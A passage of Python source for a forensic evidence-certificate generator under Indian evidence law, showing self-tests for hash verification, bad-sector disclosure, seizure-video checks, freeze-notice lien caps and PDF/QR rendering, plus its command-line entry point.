        return (badge == "FIR Complainant Receipt CCPS/2026/042-C" and "aadhaar" not in blob.lower(), badge)
    attempt("R02", "V-08: no Aadhaar number in demonstration data; complainant receipt used", r02)

    def r03() -> Tuple[Optional[bool], str]:
        if real is None:
            return None, "Sector A module not available"
        g = make(seizure_video_path=None)
        v = g.verify()
        tb = " ".join(g.part_b_paragraphs())
        s = make(seizure_video_path=None, strict=True).verify()
        return (v["status"] == READY_NOTES and not v["video_verified"] and
                any("recording was not presented" in n for n in v["notes"]) and "PROVISIONAL as to the Section 105" in tb
                and s["status"] == NOT_FIT and any(b.startswith("Strict mode") for b in s["blocking"]),
                f"no --video: {v['status']} with PART B provisional; strict mode: {s['status']}")
    attempt("R03", "V-02: an unpresented seizure recording is never READY; strict mode blocks", r03)

    def r04() -> Tuple[bool, str]:
        a = json.loads(json.dumps(demo["a"]))
        a["bnss_verification"]["sec_105_video_continuity"] = {"verified": False,
                                                              "findings": ["moov atom truncated at 00:04:11"]}
        g = BSACertificateGenerator(reseal(a), evidence_path=demo["image"], seizure_video_path=demo["video"],
                                    generated_utc=gen.generated_utc)
        v = g.verify()
        return (v["status"] == NOT_FIT and any("continuity check FAILED" in b and "moov atom" in b
                                               for b in v["blocking"]), "; ".join(v["blocking"])[:110])
    attempt("R04", "V-02: Sector A video_check.verified = false blocks the certificate", r04)

    def r05() -> Tuple[bool, str]:
        a = json.loads(json.dumps(demo["a"]))
        a["bad_sector_manifest"]["bad_sectors"] = [3]
        a["bad_sector_manifest"]["bad_byte_offsets"] = [3 * SECTOR_SIZE]
        a["bad_sector_manifest"].pop("manifest_sha256", None)
        v1 = BSACertificateGenerator(reseal(a), generated_utc=gen.generated_utc).verify()
        b = json.loads(json.dumps(demo["a"]))
        b["bad_sector_manifest"]["fill_pattern"] = "0x00000000"   # edited after its digest was taken
        v2 = BSACertificateGenerator(reseal(b), generated_utc=gen.generated_utc).verify()
        return (v1["status"] == NOT_FIT and any("carries no manifest_sha256" in x for x in v1["blocking"]) and
                v2["status"] == NOT_FIT and any(x.startswith("Bad-sector manifest has been altered")
                                                for x in v2["blocking"]),
                "digest missing -> NOT FIT; digest stale -> NOT FIT")
    attempt("R05", "V-05: bad-sector manifest without, or with a stale, manifest_sha256 is blocked", r05)

    def r06() -> Tuple[Optional[bool], str]:
        if real is None:
            return None, "Sector A module not available"
        bc = os.path.join(workdir, "bad_sector_case")
        g = BSACertificateGenerator(os.path.join(bc, "sector_a", SECTOR_A_MANIFEST),
                                    os.path.join(bc, os.path.basename(real["b"])),
                                    os.path.join(bc, "sector_c", STORYLINE_FILENAME),
                                    evidence_path=os.path.join(bc, "case_bundle.img"),
                                    seizure_video_path=os.path.join(bc, "seizure_recording_sec105.mp4"),
                                    evidence_root=bc, custodian=custodian, expert=expert,
                                    case_particulars=particulars, generated_utc=gen.generated_utc)
        g.build_certificate_pdf(os.path.join(bc, "cert.pdf"))
        r = g.last_render["recorder"]
        pa, pb = r.page_text(1).replace("\n", " "), " ".join(g.part_b_paragraphs())
        valid = g.view["sha256_valid"]
        a = json.loads(json.dumps(demo["a"]))
        a["bad_sector_manifest"]["bad_sectors"] = list(range(450))
        a["bad_sector_manifest"]["bad_byte_offsets"] = [s * SECTOR_SIZE for s in range(450)]
        bsm = a["bad_sector_manifest"]
        bsm["manifest_sha256"] = _sha256_hex(canonical_json_a({k: x for k, x in bsm.items() if k != "manifest_sha256"}))
        big = BSACertificateGenerator(reseal(a), generated_utc=gen.generated_utc)
        big.build_annexure_pdf(os.path.join(workdir, "demo", "annex_450.pdf"))
        at = "\n".join(t["text"] for t in big.last_render["annex_recorder"].text_log)
        return ("composite" in pa and "0xDEADBEEF" in pa and "readable extent" in pa and
                valid[:20] in pa.replace(" ", "") and "padded with the pattern 0xDEADBEEF" in pb and valid in pb and
                "+ 50 further sector(s)" in at and bsm["manifest_sha256"][:20] in at.replace("\n", ""),
                "PART A s.3 and PART B para 3 state composite and readable-extent SHA-256; 450 sectors -> 400 + summary")
    attempt("R06", "V-05: bad-sector fill disclosed in the sworn hash; annexure summarises past 400 rows", r06)

    def r07() -> Tuple[bool, str]:
        g = BSACertificateGenerator(generated_utc=gen.generated_utc)
        n = g.generate_sec_106_bnss_freeze_notice()
        frozen = {r for t in n["targets"] for r in t["rrns"]}
        hub = next(t for t in n["targets"] if t["tier"] == "HUB")
        ok_real = True
        detail = ""
        if real is not None:
            nr = gen.generate_sec_106_bnss_freeze_notice()
            bad = set(gen.cluster_data()["invalid_rrns"])
            ok_real = (not (bad & {r for t in nr["targets"] for r in t["rrns"]}) and
                       nr["aggregate_lien_inr"] <= nr["principal_loss_cap_inr"] + 0.005 and
                       all(t["lien_amount_inr"] == max(0.0, round(t["amount_credited_inr"] - t["amount_outflow_inr"], 2))
                           or nr["aggregate_lien_inr"] == nr["principal_loss_cap_inr"] for t in nr["targets"]))
            detail = f"; real case lien {_fmt_inr(nr['aggregate_lien_inr'])} <= cap {_fmt_inr(nr['principal_loss_cap_inr'])}"
        d2 = n["directions"][1]
        return ("628740000107" not in frozen and [d["rrn"] for d in n["disputed_or_spoofed_rrn_logs"]] == ["628740000107"]
                and n["principal_loss_cap_inr"] == 250000.0 and n["aggregate_lien_inr"] == 250000.0 and
                hub["amount_outflow_inr"] == 245000.0 and hub["lien_amount_inr"] == 5000.0 and
                "strictly to the lien amount" in d2 and "Section 107" in d2 and
                not n["text"].startswith("NOTICE UNDER SECTION 106 BHARATIYA NAGARIK SURAKSHA SANHITA, 2023 READ WITH SECTION 17(1A)")
                and "Principal loss (cap on the aggregate lien): INR 2,50,000.00" in n["text"] and ok_real,
                f"demo liens {_fmt_inr(n['aggregate_lien_inr'])} = loss {_fmt_inr(n['principal_loss_cap_inr'])} "
                f"(was INR 5,55,500.00); T7 moved to disputed log" + detail)
    attempt("R07", "V-03: net-retained liens capped at the loss; spoofed RRN not frozen; no police 17(1A)", r07)

    def r08() -> Tuple[bool, str]:
        s = gen.section45_summary()
        ev, intr, und = s["checks_evaluated"], s["supports_intrusion_hypothesis"], s["undetermined"]
        g = {x["group"]: x for x in s["groups"]}
        no_rec = make(expert={k: x for k, x in expert.items() if k != "examiner_reconciliation"})
        tb = " ".join(no_rec.part_b_paragraphs())
        return (s["exculpatory_indicator_ratio_strict"] == round(intr / ev, 4) and
                s["exculpatory_indicator_ratio_upper_bound"] == round((intr + und) / ev, 4) and
                "Section 45 BSA Exculpatory Indicator Ratio" in p2 and "Trojan-defence probability" not in p2 and
                len(g["Critical execution / access"]["checks"]) == 8 and len(g["System tampering"]["checks"]) == 6 and
                "Section 45 reconciliation" in p2 and "RECONCILIATION NOT PROVIDED" in tb and
                "trojan_defense_probability" in gen.certificate_data()["part_b"]["section45"],
                f"{s['display']}; groups 8 + 6; reconciliation printed")
    attempt("R08", "V-04: strict and upper-bound indicator ratios, grouped, with examiner reconciliation", r08)

    def r09() -> Tuple[bool, str]:
        op = next(o for o in rec.pages[0] if o[0] == "qr")
        _, x, y, module, matrix, color = op
        n = len(matrix)
        dots = module / PRINTER_DOT
        qx = X1 - 150.0
        left = x - 4 * module - qx
        right = qx + 150.0 - (x + (n + 4) * module)
        out = os.path.join(workdir, "demo", "cert_main.pdf")
        stream = pdf_inspect(out)["page_streams"][0].decode("latin-1")
        m = _num(module)
        return (color == "#000000" and abs(dots - round(dots)) < 1e-6 and round(dots) >= QR_MIN_DOTS and
                abs(left - right) < 0.01 and f"{m} 0 0 {m} 0 0 cm 0 0 0 rg" in stream,
                f"module {module} pt = {round(dots)} dots at 300 dpi, pure black, centred (margins {left:.2f} / "
                f"{right:.2f} pt)")
    attempt("R09", "V-06: QR in #000000 with modules snapped to whole 300 dpi dots, centred", r09)

    def r10() -> Tuple[bool, str]:
        out = os.path.join(workdir, "demo", "cert_main.pdf")
        with open(out, "rb") as f:
            data = f.read()
        ok = gen.pdf_engine == "pure" and data.count(b"%%EOF") == 1 and data.count(b"startxref") == 1
        detail = f"default engine {gen.pdf_engine}: {data.count(b'%%EOF')} %%EOF"
        if _HAVE_REPORTLAB:
            g = make(pdf_engine="reportlab", embed_fonts=False)
            p = g.build_certificate_pdf(os.path.join(workdir, "pure", "cert_rl_nopdfa.pdf"))
            with open(p, "rb") as f:
                rl = f.read()
            ok = ok and b"/OutputIntent" not in rl and b"/DestOutputProfile" not in rl and b"/Metadata" in rl
            detail += "; reportlab without PDF/A claim writes no ICC / OutputIntent objects"
        else:
            detail += "; reportlab not installed (orphan-object path not exercised)"
        return ok, detail
    attempt("R10", "V-07: archival default is the single-revision built-in writer; no orphan PDF/A objects", r10)

    def r11() -> Tuple[bool, str]:
        need = ("Device / record source", "Make & model / colour", "Serial number", "IMEI / UIN / UID / MAC / Cloud ID",
                "[ ] SHA-1", "[X] SHA-256", "[ ] MD5", "BLAKE2b-512, RFC 6962 SHA-256 Merkle Root")
        flat = p2.replace("\n", " ")
        missing = [k for k in need if k not in flat]
        return not missing, "all Schedule PART B device and algorithm fields present" if not missing else str(missing)
    attempt("R11", "V-08: PART B carries the device table and the SHA-1/SHA-256/MD5/Other line", r11)

    def r12() -> Tuple[Optional[bool], str]:
        if tamper is None:
            return None, "Sector A module not available"
        tamper.build_certificate_pdf(os.path.join(workdir, "tamper", "cert.pdf"))
        tr = tamper.last_render["recorder"]
        t1, t2 = tr.page_text(1), tr.page_text(2)
        good = rec.page_text(1) + rec.page_text(2)
        return ("SIGNATURE BLOCKED" in t1 and "SIGNATURE BLOCKED" in t2 and "Signature (and seal)" not in t1 + t2 and
                "Signature (and seal)" in good and "SIGNATURE BLOCKED" not in good and
                tamper.certificate_data()["readiness"]["signature"] == "BLOCKED",
                "tampered case: both signature boxes locked in red")
    attempt("R12", "Directive 3: NOT FIT certificates carry a red SIGNATURE BLOCKED box, no signature line", r12)
    return results


def _walk_kv(obj: Any, key: str) -> Iterable[Tuple[str, Any]]:
    if isinstance(obj, dict):
        for k, v in obj.items():
            if k == key and isinstance(v, (str, int)):
                yield k, v
            yield from _walk_kv(v, key)
    elif isinstance(obj, list):
        for v in obj:
            yield from _walk_kv(v, key)


def _main(argv: Sequence[str]) -> int:
    if argv and argv[0] == "--run":
        import argparse
        ap = argparse.ArgumentParser(prog="sector_d_legal.py --run")
        ap.add_argument("--evidence-manifest", required=True)
        ap.add_argument("--triage-manifest")
        ap.add_argument("--storyline")
        ap.add_argument("--evidence-root")
        ap.add_argument("--evidence-path")
        ap.add_argument("--video")
        ap.add_argument("--scenario", default="SUSPECT_HOSTILE", choices=[s.value for s in ScenarioType])
        ap.add_argument("--track", default=None, choices=list(TrackType.__members__),
                        help="SEC_57_PRIMARY or SEC_63_2_OUTPUT (legacy names TRACK_39_1_DIRECT / TRACK_39_2_OUTPUT "
                             "accepted); default follows the scenario")
        ap.add_argument("--strict", action="store_true",
                        help="block certification unless the image and the seizure recording are re-hashed")
        ap.add_argument("--custodian", help="JSON file: name, relation, address, designation, badge, police_station, "
                                            "organisation, place")
        ap.add_argument("--expert", help="JSON file: name, qualification, designation, laboratory, accreditation, "
                                         "notification_79a, notified_79a, place")
        ap.add_argument("--case", help="JSON file: court, fir, offences, seizure_memo, seizure_place, seizure_utc, "
                                       "source_type, notice_94, notice_94_utc, entity, period, io, lab")
        ap.add_argument("--pdf-engine", default="auto", choices=["auto", "reportlab", "pure"])
        ap.add_argument("--out", default="legal_package")
        a = ap.parse_args(argv[1:])
        g = BSACertificateGenerator(a.evidence_manifest, a.triage_manifest, a.storyline, a.scenario, a.track,
                                    evidence_path=a.evidence_path, seizure_video_path=a.video,
                                    evidence_root=a.evidence_root, custodian=_load_json_input(a.custodian, "custodian"),
                                    expert=_load_json_input(a.expert, "expert"),
                                    case_particulars=_load_json_input(a.case, "case particulars"),
                                    pdf_engine=a.pdf_engine, strict=a.strict)
        paths = g.export_legal_bundle(a.out)
        ver = g.verify()
        print(f"Certificate status: {ver['status']}")
        for b in ver["blocking"]:
            print("  BLOCKING:", b)
        for n in ver["notes"]:
            print("  note:", n)
        for k, p in paths.items():
            print(f"{k:>20}: {p}")
        return 0 if ver["status"] != NOT_FIT else 2
    if argv and argv[0] == "--verify-qr":
        import argparse
        ap = argparse.ArgumentParser(prog="sector_d_legal.py --verify-qr")
        ap.add_argument("payload")
        ap.add_argument("--evidence-manifest")
        ap.add_argument("--certificate-json")
        a = ap.parse_args(argv[1:])
        cert = None
        if a.certificate_json:
            cert = (_load_json_input(a.certificate_json, "certificate JSON") or {}).get("certificate")
        res = BSACertificateGenerator.verify_qr_payload(a.payload, a.evidence_manifest, cert)
        print(json.dumps(res, indent=2))
        return 0 if res["ok"] else 1
    return _self_test(argv[0] if argv else os.path.join(os.getcwd(), "sutra_legal_selftest"))


if __name__ == "__main__":
    sys.exit(_main(sys.argv[1:]))
